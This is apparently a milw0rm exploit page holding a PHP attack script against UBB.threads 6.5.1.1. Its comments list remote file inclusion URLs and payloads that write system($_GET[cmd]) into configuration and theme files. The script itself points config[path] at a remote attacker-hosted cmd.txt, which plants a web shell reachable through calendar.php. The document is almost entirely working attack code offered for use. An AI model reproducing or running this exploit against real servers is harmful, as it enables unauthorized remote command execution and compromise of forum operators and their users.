<html><head><title>UBB.threads <= 6.5.1.1 (doeditconfig.php) Code Execution Exploit</title></head><pre>#!/usr/bin/php -q -d short_open_tag=on
&lt;?
// UBB.threads Multiple input validation error

// Discovered By : HACKERS PAL
// Copy rights : HACKERS PAL
// Website : http://www.soqor.net
// Email Address : security@soqor.net

// Tested on Version 6 (6.5.1.1) and other versions maybe affected

// Remote File including :
// ubbt.inc.php?GLOBALS[thispath]=http://localhost/cmd.txt?&amp;cmd=dir
// ubbt.inc.php?GLOBALS[configdir]=http://localhost/cmd.txt?&amp;cmd=dir
// -------------------------------------------------------
// Files overwrite vulnerabilities
// if magic_qoutes_gpc = off

// admin/doedittheme.php?theme[soqor]=&quot;.system($_GET[cmd]).&quot;&amp;thispath=../
// and open includes/theme.inc.php?cmd=ls -la
// or :-
// admin/doeditconfig.php?config[soqor]=&quot;.system($_GET[cmd]).&quot;&amp;thispath=../
// and open includes/config.inc.php?cmd=ls -la

// -- # -- # -- # --

// if magic_qoutes_gpc = on
// admin/doeditconfig.php?thispath=../includes&amp;config[path]=http://psevil.googlepages.com/cmd.txt?

// and you will have a command execution files ..
// example
// dorateuser.php?cmd=ls -la
// calendar.php?cmd=ls -la
// and so many other files which includes using this variable ($config[path])
// -------------------------------------------------------
// Full path
// cron/php/subscriptions.php
// -------------------------------------------------------
// Exploit :-

/*
/*   UBB.threads Multiple vulnerabilities
/*  This exploit should allow you to execute commands
/*            By : HACKERS PAL
/*             WwW.SoQoR.NeT
*/
print_r('
/**********************************************/
/*       UBB.threads Command Execution        */
/*    by HACKERS PAL &lt;security@soqor.net&gt;     */
/*         site: http://www.soqor.net         */');
if ($argc&lt;2) {
	print_r('
/* --                                         */
/* Usage: php '.$argv[0].' host
/* Example:                                   */
/*    php '.$argv[0].' http://localhost/
/**********************************************/
');
	die;
}
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);

$url=$argv[1].&quot;/&quot;;
$exploit=&quot;admin/doeditconfig.php?thispath=../includes&amp;config[path]=http://psevil.googlepages.com/cmd.txt?&quot;;
$page=$url.$exploit;
Function get_page($url)
{

	if(function_exists(&quot;file_get_contents&quot;))
	{

		$contents = file_get_contents($url);

	}
	else
	{
		$fp=fopen(&quot;$url&quot;,&quot;r&quot;);
		while($line=fread($fp,1024))
		{
			$contents=$contents.$line;
		}

	}
	return $contents;
}

$page    = get_page($page);

$newpage = get_page($url.&quot;calendar.php&quot;);

if(eregi(&quot;Cannot execute a blank command&quot;,$newpage))
{
	Die(&quot;\n[+] Exploit Finished\n[+] Go To : &quot;.$url.&quot;calendar.php?cmd=ls -la\n[+] You Got Your Own PHP Shell\n/*        Visit us : WwW.SoQoR.NeT            */\n/**********************************************/&quot;);
}
Else
{
	Die(&quot;\n[-] Exploit Failed\n/*        Visit us : WwW.SoQoR.NeT            */\n/**********************************************/&quot;);
}
?&gt;

# milw0rm.com [2006-09-29]</pre></html>